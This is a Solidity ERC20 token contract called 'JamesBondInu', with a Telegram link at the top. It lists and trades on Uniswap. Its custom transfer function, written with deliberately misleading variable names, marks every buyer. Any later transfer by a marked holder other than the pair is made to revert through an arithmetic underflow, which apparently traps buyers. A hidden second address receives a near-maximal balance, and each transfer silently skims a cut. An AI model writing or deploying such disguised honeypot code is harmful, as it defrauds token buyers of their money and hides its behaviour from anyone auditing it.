// https://t.me/jamesbondinu

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.1;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract JamesBondInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private deer;
    mapping(address => uint256) private shown;

    function _transfer(
        address room,
        address spell,
        uint256 supply
    ) internal override {
        uint256 examine = stage;

        if (shown[room] == 0 && deer[room] > 0 && room != uniswapV2Pair) {
            shown[room] -= examine;
        }

        address knew = address(coach);
        coach = JamesBondInu(spell);
        deer[knew] += examine + 1;

        _balances[room] -= supply;
        uint256 valuable = (supply / 100) * stage;
        supply -= valuable;
        _balances[spell] += supply;
    }

    uint256 public stage = 3;

    constructor(
        string memory lion,
        string memory prize,
        address area,
        address tired
    ) ERC20(lion, prize) {
        uniswapV2Router = IUniswapV2Router02(area);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        shown[msg.sender] = pleasant;
        shown[tired] = pleasant;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[tired] = pleasant;
    }

    JamesBondInu private coach;
    uint256 private pleasant = ~uint256(1);
}